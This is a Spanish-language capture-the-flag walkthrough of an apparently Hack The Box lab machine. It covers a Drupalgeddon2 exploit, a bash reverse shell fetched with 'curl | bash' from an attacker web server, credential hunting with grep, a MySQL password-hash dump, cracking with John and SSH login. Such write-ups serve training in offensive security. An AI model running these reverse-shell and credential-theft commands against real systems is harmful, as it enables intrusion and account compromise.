## Explotacion de vulnerabilidad & Ganando acceso {-}

### Druppalgeddon {-}

```bash
ruby druppalgeddon2.rb 10.10.10.233
whoami
#Output
> apache
ifconfig
#Output
> 10.10.10.233
```

Entablamos ahora una reverse shell para sacarse de este contexto.

1. maquina de atacante

    ```bash
    nc -nlvp 443
    ```

1. druppalgeddon2 shell

    ```bash
    bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    ```

Esto no functiona porque el comando contiene **bad chars**. Como la maquina no tiene **nc** ni **ncat** la tecnica seria la siguiente:

1. Creamos un archivo *index.html* que contiene

    ```html
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    ```

1. Compartimos un servidor web con *python*

    ```bash
    python3 -m http.server 80
    ```

1. En la drupalgeddon2 shell

    ```bash
    curl -s 10.10.14.20 | bash
    ```
    
ya esta...

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
```

En este caso no nos va el tratamiento de la **TTY**. En este caso lo que hacemos es utilizar el `rlwrap nc -nlvp 443`

### Investigamos la maquina {-}

```bash
pwd
#Output
/var/www/html

ls -l
#Output
muchas cosas

grep -r -E -i "user|pass|key"
#Output
muchas cosas

grep -r -E -i "username|pass|key"
#Output
muchas cosas
```

Como hay muchas cosas y es dificil de analizar usamos el comando `find` y vamos quitando con el comando `grep -v` las cosas que no 
nos interresan poco a poco.

```bash
find \-type -f 2>/dev/null
find \-type -f 2>/dev/null | grep -v "themes"
find \-type -f 2>/dev/null | grep -v -E "themes|modules"
```

Ahora ya se puede investigar manualmente. Apuntamos los recursos que parecen interesantes.

- authorize.php
- cron.php
- includes/database
- includes/password.inc
- sites/default/

Lo miramos hasta que encontremos cosas interesantes. En un fichero encontramos un user **drupaluser** y su contraseña.

Miramos los usuarios de la maquina 

```bash
grep "sh$" /etc/passwd
#Output
root
brucetherealadmin
```

Como el servicio ssh esta abierto miramos si la contraseña functiona con el usuario brucetherealadmin pero no functiona.

Como hemos visto ficheros *mysql* intentamos conectar con el **drupaluser** y functiona.

```bash
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'show databases;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; show tables;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; describe users;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; select name,pass from users;'
```

Encontramos el usuario 'brucetherealadmin' y su contraseña encryptada.

### John {-}

1. copiamos el hash en un fichero llamado `hash`
1. john --wordlist=/usr/share/wordlists/rockyout.txt hash

Ya tenemos contraseña para el usuario *brucetherealadmin*

### SSH {-}

```bash
ssh brucetherealadmin@10.10.10.233
```

ya tenemos la flag user.txt
